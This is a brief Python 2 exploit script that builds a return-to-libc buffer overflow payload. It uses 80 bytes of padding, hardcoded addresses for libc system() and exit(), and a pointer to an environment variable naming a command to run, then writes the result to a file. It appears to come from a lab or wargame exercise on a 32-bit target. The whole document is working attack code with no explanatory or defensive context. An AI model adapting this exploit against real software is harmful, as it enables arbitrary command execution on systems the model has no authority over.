#!/usr/bin/python
import subprocess
import struct
import os

payload = 'A'*80
payload += struct.pack('<L', 0xb7ecefb0) # libc_system addr
payload += struct.pack('<L', 0xb7ec50c0) # exit addr
#payload += struct.pack('<L', 0xbfffff78) # '/usr/bin/id' addr; export USRBINID='/usr/bin/id'
payload += struct.pack('<L', 0xbffff8b4) #  export SPECIALPAYLOAD='$(pwd)/special_payload'

with open('payload', 'w') as fd:
    fd.write(payload)

